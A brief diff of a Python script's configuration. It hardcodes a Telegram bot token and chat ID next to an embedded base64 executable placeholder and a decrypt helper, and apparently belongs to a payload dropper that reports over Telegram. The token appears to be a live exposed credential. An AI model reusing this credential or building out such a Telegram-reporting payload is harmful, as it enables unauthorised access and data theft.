@@ -34,7 +34,7 @@ def decrypt(cipher_text, key, iv):
 # decrypted_textid = decrypt(cipher_textids, key, iv)
 # idbot = decrypted_textid
 # token = decrypted_texttoken
-idbot = '1002061706055'  # Đặt ID của bạn ở đây
+idbot = '-1002061706055'  # Đặt ID của bạn ở đây
 token = '6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU'  # Đặt token của bạn ở đây
 
 exe = 'BASE64_ENCODED_EXE'
